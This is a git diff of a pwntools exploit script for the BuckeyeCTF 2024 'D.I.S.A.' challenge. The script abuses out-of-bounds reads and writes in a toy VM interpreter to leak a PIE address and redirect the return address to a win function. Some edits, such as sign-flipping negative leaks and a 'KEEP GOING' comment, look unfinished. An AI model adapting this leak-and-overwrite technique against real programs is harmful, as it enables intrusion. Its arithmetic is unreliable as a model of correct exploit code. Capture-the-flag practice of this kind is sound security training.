f91e4f62ba91b194ccdd1cdffb362cec2fe4bca9
Cl1nical <cl1nical@yahoo.com>
2024-12-19 18:11:12 +0100

    buckeye disa done

--- BuckeyeCTF2024/pwn/D.I.S.A./bettersolve.py
+++ BuckeyeCTF2024/pwn/D.I.S.A./bettersolve.py
@@ -1,12 +1,14 @@
 #!/usr/bin/python3
 from pwn import *
 
+# KEEP GOING
+# PIE VALUE MORE THAN 32767 and no less than -32768
+
 elf = context.binary = ELF("disa")
 
 #b *interpreter+147
-#b *interpreter+632
 gs = '''
-c
+b *interpreter+632
 '''
 def start():
     if args.GDB:
@@ -68,7 +70,7 @@ io = start()
 io.sendlineafter(b"program:", b"PUT 4000")
 io.sendline(b"ADD")
 io.sendline(b"ADD")
-io.sendline(b"PUT 216")
+io.sendline(b"PUT 212")
 io.sendline(b"ADD") # cells[0] = 8212
 io.sendline(b"LD") # dat = 8212
 io.sendline(b"JMP") # addr = dat = 8212
@@ -78,6 +80,7 @@ io.sendline(b"RD") # print dat
 # We will recv 2 bytes at a time from the return address
 print(io.recvline())
 pie0 = int(io.recvline(timeout=1).strip(), 10) # base 10 since it is printed as a decimal integer
+log.info("pie0: %s" % pie0)
 log.info("pie0: %s" % hex(pie0))
 
 # Set dat = 1 and then add it to addr so we can read the next index: cells[8213]
@@ -92,6 +95,7 @@ io.sendline(b"RD") # print dat
 
 # recv pie1
 pie1 = int(io.recvline(timeout=1).strip(), 10)
+log.info("pie1: %s" % pie1)
 log.info("pie1: %s" % hex(pie1))
 
 # Set dat = 1 and then add it to addr so we can read the next index: cells[8214]
@@ -106,10 +110,20 @@ io.sendline(b"RD") # print dat
 
 # recv pie2
 pie2 = int(io.recvline(timeout=1).strip(), 10)
+log.info("pie2: %s" % pie2)
 log.info("pie2: %s" % hex(pie2))
 
 # Make them info hex and then string to concatenate them
 log.info("Bit shifting to make the correct address")
+if pie0 < 0:
+    pie0 *= (-1)
+
+if pie1 < 0:
+    pie1 *= (-1)
+
+if pie2 < 0:
+    pie2 *= (-1)
+
 pie0 = pie0 # do nothing, already at correct index
 pie1 = pie1 << 16 # move 16 bits is two bytes of 0's meaning 0x0000
 pie2 = pie2 << 32 # 32 bits is 4 bytes of 0's meaning 0x00000000
@@ -118,11 +132,11 @@ log.info("Pie1: %s" % hex(pie1))
 log.info("Pie2: %s" % hex(pie2))
 pie_leak = pie0 + pie1 + pie2 # Can also use '|' between them since it is a bitwise or
 log.info("Pie leak: %s" % hex(pie_leak))
-elf.address = pie_leak - 0x1229 # offset to pie base
+elf.address = pie_leak - 0x53b # offset to pie base
 log.info("Pie base: %s" % hex(elf.address))
 
 # Now we need to overwrite the return address with the win function
-win = elf.sym.win
+win = elf.address + 0x229
 log.info("Win: %s" % hex(win))
 win0 = win & 0xFFFF # Now we only have the least significant 4 bytes of the address
 win1 = (win & 0xFFFF0000) >> 16 # need it to be the correct value and then convert to 2 byte number
@@ -132,9 +146,9 @@ log.info("Win1: %s" % hex(win1))
 log.info("Win2: %s" % hex(win2))
 
 # Made some function to make the solution cleaner
-set_cell(8216, win0)
-set_cell(8217, win1)
-set_cell(8218, win2)
+set_cell(8212, win0)
+set_cell(8213, win1)
+set_cell(8214, win2)
 
 io.sendline(b"END")
 
